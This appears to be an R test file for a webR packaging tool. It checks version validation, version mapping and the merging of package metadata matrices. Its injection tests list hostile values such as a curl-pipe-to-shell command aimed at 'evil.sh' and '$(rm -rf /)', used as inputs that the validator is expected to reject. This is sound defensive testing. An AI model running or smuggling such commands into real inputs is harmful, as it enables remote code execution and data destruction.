# validate_webr_version() guards the webR version read from _webrarian.yml
# before it is interpolated into a Docker image tag / command. A strict format
# check neutralizes shell-injection payloads at the source.

test_that("validate_webr_version accepts semantic version strings", {
  expect_identical(validate_webr_version("0.5.8"), "0.5.8")
  expect_identical(validate_webr_version("1.0.0"), "1.0.0")
  expect_identical(validate_webr_version("0.4.2"), "0.4.2")
})

test_that("validate_webr_version rejects injection payloads and malformed input", {
  expect_error(
    validate_webr_version("0.5.8 && curl evil.sh | sh"),
    class = "webrarian_error_invalid_version"
  )
  expect_error(validate_webr_version("$(rm -rf /)"), class = "webrarian_error_invalid_version")
  expect_error(validate_webr_version("0.5.8; echo hi"), class = "webrarian_error_invalid_version")
  expect_error(validate_webr_version("latest"), class = "webrarian_error_invalid_version")
  expect_error(validate_webr_version(""), class = "webrarian_error_invalid_version")
  expect_error(validate_webr_version(NA_character_), class = "webrarian_error_invalid_version")
  expect_error(
    validate_webr_version(c("0.5.8", "0.5.9")),
    class = "webrarian_error_invalid_version"
  )
})

test_that("get_r_version_for_webr maps tested versions to major.minor", {
  expect_equal(get_r_version_for_webr("0.6.0"), "4.6") # current default
  # Off the vendored client's 0.6 line: exlibris would refuse to boot it.
  expect_error(get_r_version_for_webr("0.5.8"), "not supported")
  expect_error(get_r_version_for_webr("0.4.2"), "not supported")
})

test_that("default_webr_version resolves to a known, mappable version", {
  # The default must exist in the version map, or bind() would abort.
  expect_no_error(get_r_version_for_webr(default_webr_version()))
})

test_that("get_r_version_for_webr aborts on an unknown version", {
  # Better a clear error than silently building URLs for the wrong R version.
  expect_error(get_r_version_for_webr("9.9.9"), class = "webrarian_error_invalid_version")
})

test_that("align_and_rbind unions columns from PACKAGES matrices with different fields", {
  # Repos can advertise different column sets; a plain rbind() errors and the
  # whole repo's packages were being silently dropped.
  a <- matrix(
    c("A", "1.0", "methods"),
    nrow = 1,
    dimnames = list("A", c("Package", "Version", "Depends"))
  )
  b <- matrix(
    c("B", "2.0", "MIT"),
    nrow = 1,
    dimnames = list("B", c("Package", "Version", "License"))
  )

  m <- align_and_rbind(a, b)

  expect_equal(nrow(m), 2L)
  expect_setequal(colnames(m), c("Package", "Version", "Depends", "License"))
  expect_equal(m["A", "Depends"], "methods")
  expect_true(is.na(m["A", "License"]))
  expect_equal(m["B", "License"], "MIT")
  expect_true(is.na(m["B", "Depends"]))
})
